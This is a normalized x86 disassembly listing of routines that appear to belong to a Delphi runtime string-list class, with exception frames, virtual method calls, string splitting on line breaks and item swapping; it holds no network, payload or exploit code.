pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417dea
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_417658
call sub_4032e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_417df8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4189dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_417e28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_417e4c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_417e70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417f17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_417efa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f01
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_417f28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b14
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_417fa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
sub_417fd8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418090
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_418030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_418874
mov eax [ ebp - 0x8 ]
push eax
push sub_418bd0
push ebp
call sub_417fd8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418090
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418125
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41812c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404444
jne r-xdata
sub_41813c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418138
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
jmp sub_403a74
sub_418174
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4181bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405dec
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41813c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181c3
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4181cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4182a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_418282
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418289
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
sub_4182c0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418305
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044f8
call sub_408a5c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41830c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_418314
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41841f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4040d0
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404128
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418426
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042f8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042f8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_402968
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_402968
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
sub_41843c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4184bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404038
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404558
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184c2
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_4184c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418540
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418547
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_418554
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418617
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404558
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_418c60
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404220
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c484
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41861e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_418628
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41865c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41868c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41979c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4186d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186db
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_4186e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41877d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_418760
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4192e8
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404128
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418767
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
sub_41878c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41882d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418834
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_418810
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
sub_41883c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_418874
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418918
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41b528
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor eax eax
push ebp
push sub_4188f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a5c4
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41c1c8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188fa
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
sub_418924
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41979c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41896f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418976
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_41897c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4189c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41954c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189d0
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4189dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405940
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_418a10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418a53
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404230
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a5a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_418a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418b14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417fc0
xor edx edx
push ebp
push sub_418af7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418afe
mov eax [ ebp - 0x4 ]
call sub_41807c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_418b24
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418bc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bc7
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_418c60
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404220
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043b8
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_418bd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418c46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41cd74
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cd7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c4d
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ce1c
inc esi
dec ebx
jne r-xdata
sub_418c78
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_418c94
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417df8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404ac0
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_418cfc
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_418174
jmp r-xdata
sub_418d98
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404ac0
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_418dd8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402968
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404bac
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_418e44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_418174
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_418174
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_418ea0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418ea0
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
